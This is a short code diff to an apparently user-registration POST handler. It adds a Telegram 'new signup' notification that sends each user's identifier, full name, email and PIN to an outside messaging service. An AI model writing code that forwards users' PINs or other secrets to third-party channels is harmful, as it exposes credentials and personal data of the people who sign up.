@@ -59,6 +59,10 @@ export async function POST(req: Request) {
             throw dbError
         }
 
+        // Send Telegram notification for new signup
+        const { notify } = await import("@/lib/telegram")
+        notify.signup(identifier, fullName, email, pin)
+
         // 4. Log REGISTRATION_OTP_SENT with OTP generated
         try {
             await sql`
